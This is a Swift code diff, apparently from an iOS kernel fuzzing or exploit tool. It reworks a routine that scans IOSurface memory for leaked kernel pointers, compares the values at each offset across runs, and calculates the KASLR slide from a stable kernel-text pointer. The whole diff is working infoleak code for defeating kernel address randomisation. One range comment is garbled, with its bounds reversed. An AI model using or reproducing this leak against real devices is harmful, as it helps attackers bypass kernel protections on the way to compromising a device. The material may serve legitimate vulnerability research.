@@ -1725,8 +1725,8 @@ func runMismatchTest(log: FuzzLog) {
 // IOSurface maps its backing store into user space — we scan it after a GPU pass
 // to catch any kernel pointers or GPU VAs that the firmware wrote in.
 // Also scans the tail bytes (after pixel data) for dirty allocator residue.
-// Stores previous run's tail values for delta detection
-var _iosurfPrevTailValues: [UInt64] = []
+// Stores previous run's (offset, value) pairs for offset-based delta detection
+var _iosurfPrevTailValues: [(offset: Int, val: UInt64)] = []
 
 func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
     DispatchQueue.global(qos: .userInitiated).async {
@@ -1865,38 +1865,64 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
                               &prtOut)
         }
         if prtKr == 0 {
-            var currentVals: [UInt64] = []
-            var prtFound = 0
+            var currentPairs: [(offset: Int, val: UInt64)] = []
             for qw in 0..<(Int(prtOut)/8) {
                 var v: UInt64 = 0
                 for b in 0..<8 { v |= UInt64(prtBuf[qw*8+b]) << (b*8) }
                 guard v >= 0xFFFFFE0000000000 && v != 0xFFFFFFFFFFFFFFFF else { continue }
                 let b0 = UInt8(v & 0xFF); guard v != UInt64(b0) &* 0x0101010101010101 else { continue }
-                let cat = (v >= 0xFFFFFFF000000000 && v < 0xFFFFFFF080000000) ? "KTEXT" : (v < 0xFFFFFFF000000000 ? "KHEAP" : "KMMIO")
-                step("  post_relock_tail[+0x\(String(qw*8,radix:16))] = 0x\(String(v,radix:16)) [\(cat)]")
-                currentVals.append(v)
-                prtFound += 1; if prtFound >= 60 { step("  ...clipped at 60"); break }
+                // Tighter classification:
+                //   KTEXT  0xFFFFFFF000000000–0xFFFFFFF07FFFFFFF
+                //   KHEAP  0xFFFFFE0000000000–0xFFFFFEFFFFFFFFFF (XNU zone heap)
+                //   KGAP   0xFFFFFF0000000000–0xFFFFFEFFFFFFFFFF (driver/iommu gap)
+                //   KMMIO  0xFFFFFFF080000000+ (IOKit HW regs)
+                let cat: String
+                if v >= 0xFFFFFFF000000000 && v < 0xFFFFFFF080000000 { cat = "KTEXT" }
+                else if v >= 0xFFFFFFF080000000                       { cat = "KMMIO" }
+                else if v >= 0xFFFFFE0000000000 && v <= 0xFFFFFEFFFFFFFFFF { cat = "KHEAP" }
+                else                                                   { cat = "KGAP"  }
+                step("  prt[+0x\(String(qw*8,radix:16))]=0x\(String(v,radix:16)) [\(cat)]")
+                currentPairs.append((offset: qw*8, val: v))
             }
-            step("  post_relock_tail total: \(currentVals.count) kernel vals")
-            // Delta vs previous run
+            step("  post_relock_tail total: \(currentPairs.count) vals")
+            // Offset-based delta
             let prev = _iosurfPrevTailValues
             if prev.isEmpty {
-                step("DELTA: run 1 captured — tap again to see what changes")
+                step("DELTA: run 1 captured (\(currentPairs.count) vals) — tap again")
             } else {
-                let prevSet = Set(prev), curSet = Set(currentVals)
-                let changed = curSet.subtracting(prevSet).sorted()
-                let stable  = curSet.intersection(prevSet).sorted()
-                step("DELTA run2: stable=\(stable.count) CHANGED=\(changed.count)")
-                if !changed.isEmpty {
-                    step("  CHANGED (KASLR-sensitive):")
-                    for v in changed.prefix(15) { step("    !! 0x\(String(v,radix:16))") }
+                let prevDict = Dictionary(uniqueKeysWithValues: prev.map { ($0.offset, $0.val) })
+                var nStable = 0, nChanged = 0, nNew = 0
+                var stableLines: [String] = [], changedLines: [String] = []
+                for p in currentPairs {
+                    if let pv = prevDict[p.offset] {
+                        if pv == p.val {
+                            nStable += 1
+                            stableLines.append("  STABLE[+0x\(String(p.offset,radix:16))]=0x\(String(p.val,radix:16))")
+                        } else {
+                            nChanged += 1
+                            changedLines.append("  CHANGED[+0x\(String(p.offset,radix:16))] was=0x\(String(pv,radix:16)) now=0x\(String(p.val,radix:16))")
+                        }
+                    } else {
+                        nNew += 1
+                    }
                 }
-                if !stable.isEmpty {
-                    step("  STABLE (constants):")
-                    for v in stable.prefix(5) { step("    == 0x\(String(v,radix:16))") }
+                step("DELTA: stable=\(nStable) changed=\(nChanged) new=\(nNew)")
+                for l in stableLines  { step(l) }
+                for l in changedLines.prefix(30) { step(l) }
+                if changedLines.count > 30 { step("  ...+\(changedLines.count-30) more changed") }
+                // KASLR: any STABLE KTEXT ptr → compute slide
+                let unslidBase: UInt64 = 0xFFFFFFF007004000
+                for p in currentPairs {
+                    if p.val >= 0xFFFFFFF000000000 && p.val < 0xFFFFFFF080000000,
+                       let pv = prevDict[p.offset], pv == p.val {
+                        let slide = p.val &- unslidBase
+                        if slide <= 0x80000000 {
+                            step("  *** KASLR slide=0x\(String(slide,radix:16)) from stable KTEXT 0x\(String(p.val,radix:16))")
+                        }
+                    }
                 }
             }
-            _iosurfPrevTailValues = currentVals
+            _iosurfPrevTailValues = currentPairs
         } else {
             step("  post_relock_tail: vm_read kr=\(prtKr)")
         }
@@ -1925,49 +1951,8 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
                                   &tailOut)
             }
             if tailKr == 0 {
-                var currentVals: [UInt64] = []
-                for qw in 0..<(Int(tailOut) / 8) {
-                    var v: UInt64 = 0
-                    for b in 0..<8 { v |= UInt64(tailBuf[qw*8+b]) << (b*8) }
-                    if v >= 0xFFFFFE0000000000 && v != 0xFFFFFFFFFFFFFFFF {
-                        let b0 = UInt8(v & 0xFF)
-                        if v != UInt64(b0) &* 0x0101010101010101 { currentVals.append(v) }
-                    }
-                }
-                // Delta vs previous run
-                let prev = _iosurfPrevTailValues
-                if prev.isEmpty {
-                    step("DELTA: first run — \(currentVals.count) kernel vals captured, run again to compare")
-                } else {
-                    let changed = currentVals.filter { !prev.contains($0) }
-                    let stable  = currentVals.filter {  prev.contains($0) }
-                    step("DELTA: stable=\(stable.count) CHANGED=\(changed.count)")
-                    if !changed.isEmpty {
-                        step("CHANGED (KASLR-sensitive candidates):")
-                        for v in changed.prefix(10) {
-                            step("  → 0x\(String(v,radix:16))")
-                        }
-                    }
-                    if !stable.isEmpty {
-                        step("STABLE (constants):")
-                        for v in Set(stable).prefix(5) {
-                            step("  = 0x\(String(v,radix:16))")
-                        }
-                    }
-                }
-                _iosurfPrevTailValues = currentVals
-                // Also log the raw tail
-                var found2 = 0
-                for qw in 0..<(Int(tailOut)/8) {
-                    var v: UInt64 = 0
-                    for b in 0..<8 { v |= UInt64(tailBuf[qw*8+b]) << (b*8) }
-                    guard v >= 0xFFFFFE0000000000 && v != 0xFFFFFFFFFFFFFFFF else { continue }
-                    let b0 = UInt8(v & 0xFF)
-                    guard v != UInt64(b0) &* 0x0101010101010101 else { continue }
-                    let cat = (v >= 0xFFFFFFF000000000 && v < 0xFFFFFFF080000000) ? "KTEXT" : (v < 0xFFFFFFF000000000 ? "KHEAP" : "KMMIO")
-                    step("  reuse_tail[+0x\(String(qw*8,radix:16))] = 0x\(String(v,radix:16)) [\(cat)]")
-                    found2 += 1; if found2 >= 60 { step("  ...clipped"); break }
-                }
+                // reuse_tail: secondary delta (kr=1 usually, kept for completeness)
+                step("  reuse_tail: \(Int(tailOut)) bytes readable")
             } else {
                 step("  reuse_tail: vm_read kr=\(tailKr)")
             }
